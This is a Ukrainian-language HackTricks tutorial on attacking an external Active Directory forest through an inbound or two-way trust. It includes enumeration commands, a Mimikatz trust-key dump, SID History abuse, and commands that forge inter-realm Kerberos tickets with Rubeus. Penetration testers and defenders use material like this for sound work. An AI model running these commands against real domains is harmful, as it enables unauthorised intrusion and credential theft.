# Зовнішній лісовий домен - односторонній (вхідний) або двосторонній

{{#include ../../banners/hacktricks-training.md}}

У цьому сценарії зовнішній домен довіряє вам (або обидва довіряють один одному), тому ви можете отримати певний доступ до нього.

## Перерахування

Перш за все, вам потрібно **перерахувати** **довіру**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
У попередній енумерації було виявлено, що користувач **`crossuser`** знаходиться в групі **`External Admins`**, яка має **адміністративний доступ** в **DC зовнішнього домену**.

## Початковий доступ

Якщо ви **не змогли** знайти жодного **спеціального** доступу вашого користувача в іншому домені, ви все ще можете повернутися до методології AD і спробувати **підвищити привілеї з непривабливого користувача** (такі речі, як керберостинг, наприклад):

Ви можете використовувати **функції Powerview** для **енумерації** **іншого домену** за допомогою параметра `-Domain`, як у:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Імітація

### Увійти

Використовуючи звичайний метод з обліковими даними користувачів, які мають доступ до зовнішнього домену, ви повинні мати можливість отримати доступ до:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Зловживання SID Історією

Ви також можете зловживати [**SID Історією**](sid-history-injection.md) через лісовий довірчий зв'язок.

Якщо користувача **мігрують з одного лісу в інший** і **фільтрація SID не ввімкнена**, стає можливим **додати SID з іншого лісу**, і цей **SID** буде **додано** до **токена користувача** під час автентифікації **через довірчий зв'язок**.

> [!WARNING]
> Нагадаємо, що ви можете отримати ключ підпису за допомогою
>
> ```powershell
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Ви можете **підписати** **довіреним** ключем **TGT, що імплементує** користувача поточного домену.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Повний спосіб імпersonування користувача
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
{{#include ../../banners/hacktricks-training.md}}
